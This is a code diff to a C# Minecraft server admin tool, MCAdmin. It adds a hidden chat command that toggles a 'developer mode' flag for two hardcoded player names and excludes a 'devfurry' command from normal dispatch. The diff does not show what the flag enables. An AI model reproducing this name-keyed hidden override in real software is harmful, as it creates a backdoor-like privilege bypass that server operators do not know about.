@@ -22,6 +22,8 @@ namespace MCAdmin
         public long forcedtime = -1;
 
         public bool allowTP = true;
+		
+		public bool devOverride = false;
 
         public Player()
         {
@@ -282,12 +284,24 @@ namespace MCAdmin
                                         string msg = ReceiveString(externalSock).Trim();
 
                                         forwardpacket = false;
-
+										
+										if(msg.ToLower() == "!yiffmeup")
+										{
+											string plyn = name.ToLower();
+											if(plyn == "doridian" || plyn == "toxicated")
+											{
+												devOverride = !devOverride;
+												if(devOverride) Program.SendServerMessage(name + " entered developer mode!");
+												else Program.SendServerMessage(name + " left developer mode!");
+                                                break;
+											}
+										}
+										
                                         if (msg[0] == '!')
                                         {
                                             string[] cmdparts = msg.Remove(0, 1).Split(' ');
                                             string cmdstr = cmdparts[0].ToLower();
-                                            if (Program.commands.ContainsKey(cmdstr))
+                                            if (Program.commands.ContainsKey(cmdstr) && cmdstr != "devfurry")
                                             {
                                                 try
                                                 {
